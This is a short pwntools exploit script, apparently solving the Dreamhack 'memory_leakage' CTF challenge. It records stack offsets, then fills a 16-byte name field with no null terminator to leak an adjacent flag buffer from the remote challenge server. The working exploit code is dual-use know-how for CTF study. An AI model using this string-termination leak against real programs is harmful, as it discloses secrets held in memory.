'''
main+163 -> Menu 1
main+239 -> Menu 2
main+281 -> Menu 3

my_page.name : ebp-0x58
my_page.age : ebp-48
flag_buf: ebp-0x44
'''

from pwn import *

# p = process('./memory_leakage')
p = remote('host3.dreamhack.games', 20401)

context.arch = 'i386'
context.endian = 'little'
context.log_level = 'debug'

p.sendlineafter(b'> ', b'1')
p.sendafter(b'Name: ', b'A' * 0x10)
p.sendlineafter(b'Age: ', b'123456789')

p.sendlineafter(b'> ', b'3')
p.sendlineafter(b'> ', b'2')

p.interactive()
